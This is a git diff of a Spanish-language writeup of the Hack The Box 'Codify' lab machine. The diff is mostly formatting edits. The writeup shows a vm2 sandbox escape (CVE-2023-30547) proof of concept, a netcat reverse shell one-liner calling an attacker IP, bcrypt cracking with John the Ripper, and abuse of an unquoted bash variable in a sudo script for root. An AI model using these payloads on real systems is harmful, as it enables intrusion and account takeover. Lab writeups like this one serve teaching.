@@ -1,9 +1,8 @@
 ---
 layout: single
-title: HTB Codify Writeup
+title: HTB codify writeup
 date: 2023-11-07
 classes: wide
-# header:
 categories:
   - writeups
 tags:
@@ -15,9 +14,14 @@ tags:
 
 
 
-# Resumen
 
+
+
+<h1>Resumen || </h1><br>
+<div style="text-align: justify;">
 Codify es una máquina Linux que ejecuta un servidor HTTP y aloja una aplicación web desactualizada. Aprovecharemos las vulnerabilidades en esta aplicación para acceder al sistema, donde descubriremos credenciales encriptadas en formato bcrypt. Estas credenciales pueden ser explotadas de manera sencilla utilizando John The Ripper. Una vez que hayamos obtenido acceso al usuario Joshua, investigaremos cómo vulnerar un código en bash que cuenta con permisos sudo pero no está implementado con todas las medidas de seguridad necesarias. Esto nos permitirá elevar nuestros privilegios al nivel de root.
+</div>
+
 # Reconocimiento
 
 ## Puertos
@@ -28,30 +32,36 @@ Realizamos un escaneo rápido de puertos y versiones de servicios a la máquina 
 └─$ nmap -p- -sV 10.10.11.239 -T5 -oN nmap.txt -vvv
 ```
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107175436.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107175436.png)
+
+
 ## Web
 
 El puerto 80 tiene un servidor http activo: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107175901.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107175901.png)
 
 A simple vista hay tres páginas: `/limitations`, `/about`, `/editor`.
 
 El servidor contiene una aplicación web que permite testear código Node JS. Una Reverse Shell sencilla en este lenguaje no funciona por los módulos restringidos: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107180512.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107180512.png)
 
 La aplicación funciona mediante la libreria vm2 en la versión 3.9.16. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107180126.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107180126.png)
+
+
 # Penetración 
 
 ## Web
 
-La versión 3.9.16 de la librería vm2 tiene una vulnerabilidad registrada como CVE-2023–30547 (https://nvd.nist.gov/vuln/detail/CVE-2023-30547), que permite escapar de las restricciones del editor. Con ello podemos ejecutar código malicioso y una reverse shell con la que acceder al sistema víctima. 
+La versión 3.9.16 de la librería vm2 tiene una vulnerabilidad registrada como [CVE-2023–30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547), que permite escapar de las restricciones del editor. Con ello podemos ejecutar código malicioso y una reverse shell con la que acceder al sistema víctima. 
+
+
 ### Exploit
 
-Haremos uso del siguiente PoC: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+Haremos uso del siguiente [PoC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244):
 
 ```js
 const {VM} = require("vm2");
@@ -79,7 +89,7 @@ try {
 console.log(vm.run(code));
 ```
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107181134.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107181134.png)
 
 Una vez confirmada la vulnerabilidad, el acceso es ya algo mecánico. Abrimos puerto en escucha: 
 
@@ -87,7 +97,7 @@ Una vez confirmada la vulnerabilidad, el acceso es ya algo mecánico. Abrimos pu
 nc -lvp 4444
 ```
 
-Introducimos una reverse shell con el siguiente comando (https://www.revshells.com/): 
+Introducimos una [reverse shell](https://www.revshells.com/) con el siguiente comando: 
 
 ```shell 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f
@@ -95,7 +105,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f
 
 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107181459.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107181459.png)
 
 Una vez dentro, vamos a necesitar, por comodidad, una shell con todas sus funciones. Habrá que ejecutar lo siguiente: 
 
@@ -112,7 +122,7 @@ export TERM=xterm
 En `/home` vemos un usuario posiblemente vulnerable: `joshua`
 En `/var/www/contact` hay un archivo SQLite con un hash en bcrypt. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107182336.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107182336.png)
 
 Con John The Ripper se tarda menos de treinta segundos en hacerse cargo de ella: 
 
@@ -120,7 +130,7 @@ Con John The Ripper se tarda menos de treinta segundos en hacerse cargo de ella:
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt
 ```
 
-`joshua:spongebob1`
+
 # Acceso y Escalada de Privilegios
 
 ```shell
@@ -131,11 +141,11 @@ Aquí está la flag `user.txt`.
 
 Para escalar privilegios vamos a revisar qué puede hacer nuestro usuario Joshua: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107182843.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107182843.png)
 
 Parece ser que podemos ejecutar un comando con permisos sudo que pregunta por la contraseña root. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107183231.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107183231.png)
 
 Está programado con ciertas vulnerabilidades de seguridad. Al no estar las variables entre comillas, nos permite realizar que se lean como comandos y no sólo como variables.
 
@@ -163,4 +173,4 @@ while not found:
 
 Lo creamos en `/tmp`, le damos permisos de ejecución y nos da la contraseña en cuestión de minutos. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107183856.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107183856.png)
